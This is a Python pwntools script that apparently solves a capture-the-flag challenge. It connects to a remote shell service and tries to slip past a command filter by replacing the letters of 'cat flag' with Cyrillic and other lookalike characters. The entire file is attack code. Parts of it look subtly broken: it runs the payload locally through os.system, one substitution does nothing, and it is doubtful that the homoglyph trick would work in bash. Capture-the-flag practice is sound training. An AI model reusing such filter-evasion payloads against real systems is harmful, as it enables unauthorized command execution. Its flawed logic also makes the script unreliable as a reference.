#!/usr/bin/env python3
from pwn import *

HOST = "bashinatorrevenge.challs.territoriali.olicyber.it"
PORT = 38003

r = remote(HOST, PORT)

banner = r.recvuntil("$ ").decode()
print(banner)

r.sendline("ls")
files = r.recvline().decode().strip()
print("Files:", files)


def build_payload(command):
    """
    Builds a payload to bypass the filter.
    Replaces 'c', 'a', 't' with Cyrillic characters.
    Replaces 'f', 'l', 'a', 'g' with special characters.
    """
    payload = command.replace('c', 'с')
    payload = payload.replace('a', 'а')
    payload = payload.replace('t', 'т')
    payload = payload.replace('f', 'ƒ')
    payload = payload.replace('l', 'l')
    payload = payload.replace('g', 'ɡ')
    return payload

payload = build_payload("cat flag")

ls = os.system(payload)
print(ls)
# Invia il payload
r.sendline(payload)

# Ricevi ed stampa la risposta (il contenuto del file flag)
flag = r.recvline().strip()
print("Flag:", flag.decode())

r.close()
